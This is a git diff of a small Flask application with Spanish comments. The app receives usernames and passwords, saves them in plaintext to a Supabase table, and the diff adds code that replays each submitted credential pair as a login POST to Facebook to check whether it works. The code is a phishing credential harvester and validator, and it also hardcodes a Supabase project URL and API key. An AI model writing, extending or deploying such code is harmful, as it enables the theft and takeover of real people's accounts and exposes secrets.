@@ -1,14 +1,12 @@
 from flask import Flask, request, render_template, jsonify
 from supabase import create_client, Client
-import os
+import requests  # Para realizar el login a otra página web
 
-# Configuración de Flask
 app = Flask(__name__)
 
-# Configuración de Supabase
-SUPABASE_URL = os.getenv("SUPABASE_URL", "flaskproject2-3.vercel.app")  # Sustituye con tu Project URL
-SUPABASE_KEY = os.getenv("SUPABASE_KEY", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im93b3l6cmZsY2F6b3BhZGNzeXZvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzQ4OTYwNDUsImV4cCI6MjA1MDQ3MjA0NX0.Sorhymr26eaWHep_bVj2DNklZeKJK9NKRLLhjj3U47E")  # Sustituye con tu API Key
-
+# Tu URL y clave de Supabase
+SUPABASE_URL = "https://owoyzrflcazopadcsyvo.supabase.co"  # Sustituye con tu Project URL
+SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im93b3l6cmZsY2F6b3BhZGNzeXZvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzQ4OTYwNDUsImV4cCI6MjA1MDQ3MjA0NX0.Sorhymr26eaWHep_bVj2DNklZeKJK9NKRLLhjj3U47E"  # Sustituye con tu API Key
 supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
 
 
@@ -27,18 +25,29 @@ def save_data():
     password = data.get("password")
 
     try:
-        # Inserta los datos en la tabla de Supabase
+        # 1. Guardar datos en Supabase
         response = supabase.table("Brandell").insert(
             {"username": username, "password": password}
         ).execute()
 
-        if response.get("status_code") == 200:
-            return jsonify({"status": "success", "message": "Data saved successfully"})
+        if response.get("status_code") != 200:
+            return jsonify({"status": "error", "message": "Failed to save data"}), 500
+
+        # 2. Realizar login en otra página web
+        login_url = "https://www.facebook.com/"  # URL de login de la web deseada
+        login_payload = {"username": username, "password": password}  # Cambiar según los campos esperados por la web
+        login_headers = {"Content-Type": "application/x-www-form-urlencoded"}  # Cambiar si la web usa otro formato
+
+        # Realizar la solicitud POST
+        login_response = requests.post(login_url, data=login_payload, headers=login_headers)
+
+        if login_response.status_code == 200:
+            return jsonify({"status": "success", "message": "Data saved and login successful"})
         else:
-            return jsonify({"status": "error", "message": response.get("message")}), 500
+            return jsonify({"status": "error", "message": "Login failed on external site"}), 401
+
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
-
 
 
 if __name__ == "__main__":
